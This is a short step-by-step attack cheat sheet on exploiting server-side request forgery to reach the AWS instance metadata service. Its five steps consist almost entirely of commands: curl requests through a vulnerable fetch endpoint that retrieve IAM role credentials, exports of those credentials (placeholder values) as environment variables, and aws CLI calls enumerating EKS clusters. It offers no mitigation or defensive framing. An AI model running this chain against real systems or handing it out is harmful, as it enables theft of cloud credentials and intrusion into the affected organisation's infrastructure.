# SSRF to AWS Metadata

#### 1) Discovering the vulnerable endpoint

    curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/"

#### 2) Accessing the metadata service through SSRF

    curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

#### 3) Extracting IAM role credentials

    curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role"

#### 4) Weaponizing the stolen credentials

    export AWS_ACCESS_KEY_ID="AKIAEXAMPLE123456789"
    export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHoaCXVzLXdlc3QtMiJGMEQCIH..."

#### 5) Enumerating EKS resources

    aws eks list-clusters
    aws eks describe-cluster --name production-cluster
